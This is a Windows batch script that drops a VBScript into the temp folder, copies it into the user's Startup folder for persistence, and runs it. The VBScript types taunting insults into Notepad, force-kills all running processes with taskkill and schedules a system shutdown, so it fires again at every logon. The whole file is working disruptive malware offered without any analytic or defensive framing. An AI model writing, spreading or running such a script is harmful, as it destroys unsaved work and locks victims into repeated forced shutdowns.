@echo off
:start

color 0
cd %temp%


echo Set objShell = CreateObject("WScript.Shell") >>939.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >>939.vbs

echo Set x = CreateObject("WScript.Shell") >>939.vbs

echo x.SendKeys "^{ESC}" >>939.vbs
echo WScript.Sleep(1000) >>939.vbs

echo x.SendKeys "cmd" >>939.vbs
echo WScript.Sleep(500) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(1000) >>939.vbs

echo x.SendKeys "notepad.exe" >>939.vbs
echo WScript.Sleep(100) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(2000) >>939.vbs

echo x.SendKeys "You are completly Fucked now..." >>939.vbs
echo WScript.Sleep(2000) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(300) >>939.vbs

echo x.SendKeys "HAHAHAHAHAHAHAHAHA" >>939.vbs
echo WScript.Sleep(100) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(100) >>939.vbs

echo x.SendKeys "^{ESC}" >>939.vbs
echo WScript.Sleep(400) >>939.vbs

echo x.SendKeys "cmd" >>939.vbs
echo WScript.Sleep(500) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(1000) >>939.vbs

echo x.SendKeys "shutdown /s /t 30 /c ""Your are an Idiot xaxaxaxaxaxa""" >>939.vbs
echo WScript.Sleep(100) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(250) >>939.vbs

echo x.SendKeys "taskkill /F /FI ""STATUS eq RUNNING""" >>939.vbs
echo WScript.Sleep(100) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(100) >>939.vbs

echo x.SendKeys "exit" >>939.vbs
echo WScript.Sleep(100) >>939.vbs
echo x.SendKeys "{ENTER}" >>939.vbs
echo WScript.Sleep(100) >>939.vbs

copy "%temp%\939.vbs" "C:\users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


start 939.vbs
exit